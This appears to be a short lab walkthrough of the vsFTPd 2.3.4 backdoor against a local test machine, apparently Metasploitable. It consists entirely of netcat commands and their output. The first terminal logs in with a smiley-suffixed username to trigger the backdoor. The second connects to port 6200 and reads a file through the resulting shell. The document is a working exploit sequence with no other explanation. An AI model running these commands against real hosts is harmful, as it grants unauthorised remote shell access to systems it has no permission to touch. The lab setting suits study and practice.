```bash
# NOTE: Terminal 1
~ nc 192.168.0.167 21
220 (vsFTPd 2.3.4) # Output
user nabil:)
331 Please specify the password. # Output
pass any
```

```bash
# NOTE: Terminal 2
~ nc 192.168.0.167 6200
cat home/msfadmin/nabil.md
You success to find the target
```
